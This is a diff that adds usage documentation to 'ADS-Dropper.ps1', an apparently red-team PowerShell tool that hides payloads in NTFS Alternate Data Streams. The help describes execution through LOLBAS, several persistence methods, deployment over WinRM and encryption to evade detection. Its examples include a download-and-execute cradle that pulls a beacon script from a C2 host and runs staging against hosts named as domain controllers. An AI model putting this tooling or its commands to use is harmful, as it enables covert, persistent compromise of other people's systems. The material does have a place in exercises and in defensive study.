@@ -2,6 +2,33 @@
 <#
 .SYNOPSIS
     ADS-Dropper: C2-Agnostic ADS Persistence (Imix/MSF/Sliver/CCDC)
+.DESCRIPTION
+    Stores *any* PowerShell payload in NTFS Alternate Data Streams, executes via LOLBAS,
+    persists via multiple techniques (incl. novel $LOGGED_UTILITY_STREAM, volume root).
+    Credits: Oddvar Moe, Enigma0x3/Api0cradle, MITRE T1564.004
+.PARAMETER Payload
+    Raw PowerShell payload string, Base64, or @('file.ps1'). Imix/MSF/Sliver all work identically.
+.PARAMETER Targets
+    Hostnames/IPs (localhost=default). Uses WinRM.
+.PARAMETER Persist
+    task,wmi,reg,volroot,logstream (comma-sep). Auto-fallbacks by priv.
+.PARAMETER Randomize
+    Random paths/names/AES keys for OPSEC.
+.PARAMETER Encrypt
+    AES-encrypt payload (key=MachineGUID).
+.PARAMETER NoExec
+    Dry-run (stage but don't execute).
+.EXAMPLE
+    # Imix (your current workflow)
+    $imixB64 = "VGhpcyBpcyBteSBJTWl4IHN0YWdlci4uLg=="
+    .\ADS-Dropper.ps1 -Payload $imixB64 -Persist task -Randomize
+    
+    # Metasploit beacon_meterpreter
+    $msf = "IEX(New-Object Net.WebClient).DownloadString('http://c2/beacon.ps1')"
+    .\ADS-Dropper.ps1 -Payload $msf -Persist volroot,reg
+    
+    # Sliver/custom file
+    .\ADS-Dropper.ps1 -Payload @('sliver_stager.ps1') -Targets dc01,web01
 #>
 
 [CmdletBinding()] param(
